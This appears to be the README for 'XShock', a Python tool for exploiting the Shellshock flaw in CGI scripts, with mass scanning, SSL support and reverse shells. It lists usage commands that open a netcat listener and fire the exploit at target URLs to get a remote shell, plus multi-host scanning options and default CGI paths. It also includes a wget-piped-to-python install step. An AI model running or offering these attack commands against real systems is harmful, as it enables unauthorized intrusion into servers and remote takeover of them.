____  ___  _________.__                   __    
\   \/  / /   _____/|  |__   ____   ____ |  | __
 \     /  \_____  \ |  |  \ /  _ \_/ ___\|  |/ /
 /     \  /        \|   Y  (  <_> )  \___|    < 
/___/\  \/_______  /|___|  /\____/ \___  >__|_ \
      \_/        \/      \/            \/     \/
Version 0.1, Created by SeCToR-X (_sector_@hackermail.com)

Features:

+ SSL support
+ Mass Scanner
+ 4 reverse shell types

[Installing netifaces]

1 - wget https://bootstrap.pypa.io/ez_setup.py -O - | python
2 - wget https://pypi.python.org/packages/source/n/netifaces/netifaces-0.10.4.tar.gz
3 - tar xzvf netifaces-0.10.4.tar.gz
4 - cd netifaces-0.10.4
5 - python setup.py install

[Usage examples]

1 - Directly exploit:
nc -nlvp 443
xshock.py -u http://192.168.90.139/cgi-bin/status -r 0

2 - Directly exploit with specified port
nc -nlvp 8080
xshock.py -u http://192.168.90.139/cgi-bin/status -r 0 -p 8080

3 - Scanning single target with multiple directory files (possible urls)
xshock.py -u http://192.168.90.139 -s -f small.txt

4 - Scanning single target with multiple directory files and interval of 2 seconds on each retry 
xshock.py -u http://192.168.90.139 -s -f small.txt -t 2

5 - Scanning multiple hosts with default dirs
xshock.py -f hosts.txt -s

[Default Values]

Default interval time on each retry: 5 seconds
Default directory files:
/cgi-bin/test
/cgi-bin/test.cgi
/cgi-bin/status
/cgi-bin/status.cgi

[Faq]

Q: I'm receiving the following message: "problem on connecting. Leaving now..."
A: Are sure the host ip up? If is your directory files don't have / after each line. To solve the
problem type xshock.py -u http://192.168.90.139/ -s -f small.txt instead xshock.py -u http://192.168.90.139 -s -f small.txt.

Q: If i have two interfaces how i exploit to specified interface?
A: use the flag -i <interface>. Ex: xshock.py -u http://192.168.90.139/cgi-bin/status -i eth1 -r 0

Thanks:
- Claudio Viviani for ideia of exploit written in python
- Pentestmonkey Reverse Shell Cheat
- My friends
